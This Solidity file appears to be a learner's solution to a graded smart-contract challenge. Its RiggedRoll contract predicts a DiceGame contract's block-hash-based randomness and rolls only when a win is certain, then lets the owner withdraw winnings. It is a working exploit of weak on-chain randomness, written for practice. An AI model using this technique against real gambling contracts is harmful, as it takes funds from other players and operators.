pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool ok, ) = _addr.call{value: _amount}("");

        require(ok, "Didn't work!");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    function riggedRoll() public {
        require(address(this).balance >= .002 ether, "Need .002 either to roll");

        console.log("block number riggedRoll %s", block.number - 1);
        console.log("rigged roll nonce %s", diceGame.nonce());
        console.log("rigged roll dice game address is %s", address(diceGame));

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        
        console.log("roll is %s", roll);

        require(roll < 6, "Roll is not less than 6");
        if (roll < 6) {
            console.log("Calling rollTheDice from  RiggedRoll");
            diceGame.rollTheDice{value: 0.002 ether}();
        }

    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.

    receive() external payable {}
}
